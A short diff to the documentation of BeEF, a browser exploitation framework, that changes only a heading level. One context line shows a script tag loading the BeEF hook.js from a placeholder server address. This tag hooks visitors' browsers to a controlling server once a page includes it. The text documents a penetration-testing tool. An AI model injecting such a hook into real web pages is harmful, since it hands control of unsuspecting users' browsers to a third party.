@@ -93,7 +93,7 @@ If your BeEF server is 123.123.123.123:3000 then you can include the script usin
 <script src="http://123.123.123.123:3000/hook.js"></script>
 
 
-# Web Server Configuration
+### Web Server Configuration
 
 The web server can be fully configured, this is done in the HTTP subsection of the [`config.yaml`](https://github.com/beefproject/beef/blob/master/config.yaml) file:
 
